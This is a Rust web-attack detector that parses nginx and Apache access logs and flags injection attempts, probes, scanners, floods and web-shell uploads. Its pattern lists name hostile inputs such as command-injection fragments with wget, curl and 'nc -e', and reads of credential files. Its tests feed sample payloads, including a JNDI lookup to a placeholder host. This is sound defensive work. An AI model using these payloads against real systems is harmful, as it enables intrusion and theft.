//! Attacks on web servers, from access logs in the common and combined
//! formats that nginx and Apache write by default.
//!
//! Behind a proxy the first field is the proxy; put the real client first in
//! the log format, or these rules will blame the proxy.

use std::net::IpAddr;

use chrono::{DateTime, Local};

use super::config::Thresholds;
use super::filter::{source_key, Counter};
use super::{Stage, Threat};
use crate::common::model::Severity;

#[derive(Debug, PartialEq, Eq)]
pub struct Request {
    pub ip: IpAddr,
    pub method: String,
    pub path: String,
    pub status: u16,
    pub agent: String,
}

/// The parts of a line, reading quoted fields as written: a path or user
/// agent can contain anything but an unescaped quote.
pub fn parse(line: &str) -> Option<Request> {
    let (ip, rest) = line.split_once(' ')?;
    let ip: IpAddr = ip.parse().ok()?;
    let (_, rest) = rest.split_once("] \"")?;
    let (request, rest) = rest.split_once("\" ")?;
    let mut parts = request.splitn(3, ' ');
    let (method, path) = (parts.next()?.to_string(), parts.next().unwrap_or("").to_string());
    let status = rest.split_whitespace().next()?.parse().ok()?;
    let agent = rest.rsplit('"').nth(1).unwrap_or("").to_string();
    Some(Request { ip, method, path, status, agent })
}

fn hex(b: u8) -> Option<u8> {
    (b as char).to_digit(16).map(|d| d as u8)
}

/// Lower case with percent escapes undone, twice for double encoding.
fn normalize(path: &str) -> String {
    let mut text = path.as_bytes().to_vec();
    for _ in 0..2 {
        let mut out = Vec::with_capacity(text.len());
        let mut i = 0;
        while i < text.len() {
            let decoded = (text[i] == b'%' && i + 2 < text.len()).then(|| Some(hex(*text.get(i + 1)?)? * 16 + hex(*text.get(i + 2)?)?)).flatten();
            match decoded {
                Some(b) => {
                    out.push(b);
                    i += 3;
                }
                None => {
                    out.push(if text[i] == b'+' { b' ' } else { text[i] });
                    i += 1;
                }
            }
        }
        text = out;
    }
    String::from_utf8_lossy(&text).to_lowercase()
}

/// (rule, title, patterns): what an exploit attempt looks like in a URL.
const ATTACKS: &[(&str, &str, &[&str])] = &[
    ("web-sql-injection", "SQL injection", &["union select", "union all select", "' or '1'='1", "' or 1=1", "\" or 1=1", "information_schema", "sleep(", "benchmark(", "extractvalue(", "xp_cmdshell", "';--"]),
    ("web-path-traversal", "path traversal", &["../", "..\\", "/etc/passwd", "/etc/shadow", "/proc/self/", "c:\\windows", "boot.ini", "php://filter"]),
    ("web-command-injection", "command injection", &["${jndi:", ";wget ", ";curl ", "|wget ", "|curl ", "$(wget", "$(curl", "`wget", "/bin/sh", "/bin/bash", "cmd.exe", "powershell", "nc -e", "base64 -d"]),
    ("web-xss", "script injection", &["<script", "javascript:", "onerror=", "onload="]),
    ("web-template-injection", "template injection", &["{{7*7}}", "${7*7}", "<%=", "class.module.classloader"]),
];

const PROBES: &[&str] = &["/.env", "/.git/", "/.aws/", "/.ssh/", "/wp-login.php", "/xmlrpc.php", "/phpmyadmin", "/vendor/phpunit", "/actuator/", "/cgi-bin/", "/boaform", "/manager/html", "/.ds_store", "/server-status", "/console/"];
const SCANNERS: &[&str] = &["sqlmap", "nikto", "nuclei", "masscan", "zgrab", "nmap", "gobuster", "dirbuster", "wpscan", "acunetix", "nessus", "feroxbuster", "ffuf"];
const UPLOAD_DIRS: &[&str] = &["/uploads/", "/upload/", "/images/", "/files/", "/tmp/", "/static/", "/assets/"];
const SCRIPTS: &[&str] = &[".php", ".jsp", ".jspx", ".asp", ".aspx", ".phtml"];

pub struct Detector {
    limits: Thresholds,
    requests: Counter<IpAddr>,
    errors: Counter<IpAddr>,
}

impl Detector {
    pub fn new(limits: Thresholds) -> Detector {
        Detector { requests: Counter::new(60), errors: Counter::new(60), limits }
    }

    pub fn feed(&mut self, line: &str, now: DateTime<Local>) -> Vec<Threat> {
        let Some(r) = parse(line) else { return Vec::new() };
        let t = now.timestamp();
        let key = source_key(r.ip);
        let path = normalize(&r.path);
        let agent = r.agent.to_lowercase();
        let mut out = Vec::new();
        let n = self.requests.add(key, t);
        if n >= self.limits.http_per_minute {
            out.push(Threat::new(now, "http-flood", Severity::High, Stage::Impact, format!("{n} requests a minute from {}", r.ip)).source_ip(r.ip).with_evidence(line));
        }
        if (400..500).contains(&r.status) && self.errors.add(key, t) >= self.limits.http_errors_per_minute {
            out.push(Threat::new(now, "web-scan", Severity::Medium, Stage::Recon, format!("{} is scanning for pages", r.ip)).source_ip(r.ip).with_evidence(line));
        }
        if let Some(name) = SCANNERS.iter().find(|s| agent.contains(**s)) {
            out.push(Threat::new(now, "web-scanner", Severity::Medium, Stage::Recon, format!("Attack tool {name} from {}", r.ip)).source_ip(r.ip).with_evidence(line));
        }
        if PROBES.iter().any(|p| path.contains(p)) {
            out.push(Threat::new(now, "web-probe", Severity::Low, Stage::Recon, format!("{} probed a sensitive path", r.ip)).source_ip(r.ip).with_evidence(line));
        }
        // An attempt the server answered with success may have worked.
        let answered = (200..300).contains(&r.status);
        for (rule, title, patterns) in ATTACKS {
            if patterns.iter().any(|p| path.contains(p)) {
                let (severity, stage) = if answered { (Severity::High, Stage::Foothold) } else { (Severity::Medium, Stage::Attempt) };
                let what = if answered { "answered with success" } else { "rejected" };
                out.push(Threat::new(now, rule, severity, stage, format!("{title} from {}, {what}", r.ip)).source_ip(r.ip).with_evidence(line));
            }
        }
        let file = path.split('?').next().unwrap_or("");
        if r.method == "POST" && answered && UPLOAD_DIRS.iter().any(|d| file.contains(d)) && SCRIPTS.iter().any(|s| file.ends_with(s)) {
            out.push(Threat::new(now, "webshell-access", Severity::Critical, Stage::Execution, format!("Possible web shell at {}", crate::common::text::truncate(file, 80))).source_ip(r.ip).with_evidence(line));
        }
        out
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::TimeZone;

    fn at(s: i64) -> DateTime<Local> {
        Local.timestamp_opt(1_800_000_000 + s, 0).unwrap()
    }

    fn log(method: &str, path: &str, status: u16, agent: &str) -> String {
        format!("203.0.113.8 - - [05/Nov/2026:10:00:00 +0800] \"{method} {path} HTTP/1.1\" {status} 512 \"-\" \"{agent}\"")
    }

    fn rules(line: &str) -> Vec<&'static str> {
        Detector::new(Thresholds::default()).feed(line, at(0)).iter().map(|t| t.rule).collect()
    }

    #[test]
    fn reads_combined_and_common_lines() {
        let r = parse(&log("GET", "/a?b=c", 200, "curl/8 (x) \"y")).unwrap();
        assert_eq!((r.method.as_str(), r.path.as_str(), r.status), ("GET", "/a?b=c", 200));
        let c = parse("2001:db8::1 - bob [05/Nov/2026:10:00:00 +0800] \"GET / HTTP/1.0\" 404 12").unwrap();
        assert_eq!(c.status, 404);
        assert!(parse("garbage").is_none());
        assert!(parse("").is_none());
    }

    #[test]
    fn sees_attacks_through_encoding() {
        assert_eq!(rules(&log("GET", "/?id=1%20UNION%20SELECT%20password", 500, "x")), ["web-sql-injection"]);
        assert_eq!(rules(&log("GET", "/?f=%252e%252e%252fetc%252fpasswd", 404, "x")), ["web-path-traversal"]);
        assert_eq!(rules(&log("GET", "/?x=${jndi:ldap://e.example/a}", 403, "x")), ["web-command-injection"]);
        assert_eq!(rules(&log("GET", "/?q=<ScRiPt>", 400, "x")), ["web-xss"]);
        assert_eq!(rules(&log("GET", "/.env", 404, "sqlmap/1.7")), ["web-scanner", "web-probe"]);
        assert!(rules(&log("GET", "/products/select-union-jack?page=2", 200, "Mozilla/5.0")).is_empty());
    }

    #[test]
    fn success_makes_an_attempt_worse() {
        let mut d = Detector::new(Thresholds::default());
        let ok = d.feed(&log("GET", "/?f=../../etc/passwd", 200, "x"), at(0));
        assert_eq!((ok[0].severity, ok[0].stage), (Severity::High, Stage::Foothold));
        let no = d.feed(&log("GET", "/?f=../../etc/passwd", 403, "x"), at(0));
        assert_eq!((no[0].severity, no[0].stage), (Severity::Medium, Stage::Attempt));
    }

    #[test]
    fn web_shells_and_floods() {
        assert_eq!(rules(&log("POST", "/uploads/2026/a.php", 200, "x")), ["webshell-access"]);
        assert!(rules(&log("POST", "/index.php", 200, "x")).is_empty());
        let mut d = Detector::new(Thresholds::default());
        let mut flood = false;
        for _ in 0..700 {
            flood |= d.feed(&log("GET", "/", 200, "x"), at(1)).iter().any(|t| t.rule == "http-flood");
        }
        assert!(flood);
        let mut d = Detector::new(Thresholds::default());
        let mut scan = false;
        for i in 0..100 {
            scan |= d.feed(&log("GET", &format!("/p{i}"), 404, "x"), at(1)).iter().any(|t| t.rule == "web-scan");
        }
        assert!(scan);
    }
}
